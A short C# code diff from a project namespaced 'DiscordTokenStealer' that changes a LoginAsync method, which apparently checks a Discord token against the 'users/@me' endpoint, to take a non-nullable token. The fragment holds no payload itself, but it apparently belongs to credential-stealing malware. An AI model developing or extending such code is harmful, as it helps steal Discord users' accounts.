@@ -4,7 +4,7 @@ namespace DiscordTokenStealer.Discord;
 
 public partial class DiscordClient
 {
-    public async Task<DiscordUser?> LoginAsync(string? token)
+    public async Task<DiscordUser?> LoginAsync(string token)
     {
         using var request = new HttpRequestMessage(HttpMethod.Get, "users/@me")
         {
